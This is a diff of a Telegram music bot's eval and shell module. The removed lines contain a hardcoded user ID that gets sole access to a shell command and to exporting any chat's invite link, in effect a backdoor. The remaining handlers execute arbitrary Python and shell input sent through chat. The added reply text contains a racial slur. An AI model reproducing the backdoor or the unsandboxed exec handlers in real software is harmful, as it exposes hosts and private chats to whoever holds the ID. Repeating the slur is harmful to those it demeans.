@@ -10,7 +10,7 @@
 # This aeval and sh module is taken from < https://github.com/TheHamkerCat/WilliamButcherBot >
 # Credit goes to TheHamkerCat.
 #
-import asyncio
+
 import os
 import re
 import subprocess
@@ -26,34 +26,24 @@ from pyrogram.types import (InlineKeyboardButton,
 
 from YukkiMusic import app
 from YukkiMusic.misc import SUDOERS
-from YukkiMusic.utils.database.memorydatabase import get_active_chats
-from YukkiMusic.utils.database.memorydatabase import get_active_video_chats
-from YukkiMusic.utils.database.mongodatabase import get_served_chats
-from YukkiMusic import userbot
+
 
 async def aexec(code, client, message):
     exec(
         "async def __aexec(client, message): "
-        + "\n zen = app"
-        + "\n m = message"
-        + "\n r = message.reply_to_message"
-        + "\n vcs = get_active_chats"
-        + "\n vcd = get_active_video_chats"
-        + "\n s_chats = get_served_chats"
-        + "\n ub = userbot"
         + "".join(f"\n {a}" for a in code.split("\n"))
     )
     return await locals()["__aexec"](client, message)
+
 
 async def edit_or_reply(msg: Message, **kwargs):
     func = msg.edit_text if msg.from_user.is_self else msg.reply
     spec = getfullargspec(func.__wrapped__).args
     await func(**{k: v for k, v in kwargs.items() if k in spec})
 
-BION = [907544310]    
 
 @app.on_message(
-    filters.command(["eval", "e", "ev"], [".", "-", "!", "^", ";", ":", "/"])
+    filters.command("eval")
     & SUDOERS
     & ~filters.forwarded
     & ~filters.via_bot
@@ -61,7 +51,7 @@ BION = [907544310]
 async def executor(client, message):
     if len(message.command) < 2:
         return await edit_or_reply(
-            message, text="❓ __What command to execute.__"
+            message, text="__Nigga Give me some command to execute.__"
         )
     try:
         cmd = message.text.split(" ", maxsplit=1)[1]
@@ -159,24 +149,10 @@ async def forceclose_command(_, CallbackQuery):
     except:
         return
 
-@app.on_message(
-    filters.command("link")
-    & filters.user(BION)
-    & ~filters.forwarded
-    & ~filters.via_bot
-)
-async def link_cmd(client, message):
-    if len(message.command) < 2:
-        return await edit_or_reply(
-            message, text="**Usage:**\n/link [chat id]"
-        )
-    id = message.text.split(None, 1)[1].strip()
-    data = await app.export_chat_invite_link(id)
-    await message.reply(f"{data}")
 
 @app.on_message(
     filters.command("sh")
-    & filters.user(BION)
+    & SUDOERS
     & ~filters.forwarded
     & ~filters.via_bot
 )
